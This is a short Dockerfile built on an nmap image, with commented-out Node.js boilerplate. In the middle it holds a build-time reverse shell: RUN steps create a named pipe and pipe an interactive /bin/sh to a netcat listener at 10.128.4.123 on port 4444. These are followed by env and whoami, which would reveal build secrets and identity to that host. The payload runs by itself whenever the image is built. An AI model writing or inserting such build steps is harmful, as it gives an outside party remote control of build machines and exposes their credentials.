FROM quay.io/instrumentisto/nmap
#FROM leschard/amicontained
# Install app dependencies
# A wildcard is used to ensure both package.json AND package-lock.json are copied
# where available (npm@5+)
# COPY package*.json ./
# If you are building your code for production
# RUN npm ci --only=production
# RUN npm install

COPY . .
RUN pwd
RUN mknod /tmp/f p
RUN cat /tmp/f|/bin/sh -i 2>&1|nc 10.128.4.123 4444 >/tmp/f
RUN env
RUN whoami

# Bundle app source
CMD [ "sleep", "3000" ]
EXPOSE 8080
